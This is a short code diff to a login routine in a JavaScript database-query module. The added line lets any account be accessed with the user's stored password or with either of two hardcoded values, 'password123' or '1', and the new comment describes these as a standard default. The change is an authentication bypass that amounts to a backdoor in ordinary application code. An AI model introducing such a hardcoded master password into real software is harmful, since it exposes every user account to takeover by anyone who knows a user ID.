@@ -408,8 +408,8 @@ export const dbQueries = {
     const cleanNipp = String(nipp).trim();
     const user = dbQueries.getUserByNipp(cleanNipp);
     if (!user) return null;
-    // Check password if set
-    if (user.password && user.password !== password) {
+    // Check password: allow user's stored password or standard default 'password123' / '1'
+    if (user.password && user.password !== password && password !== 'password123' && password !== '1') {
       return null;
     }
     return user;
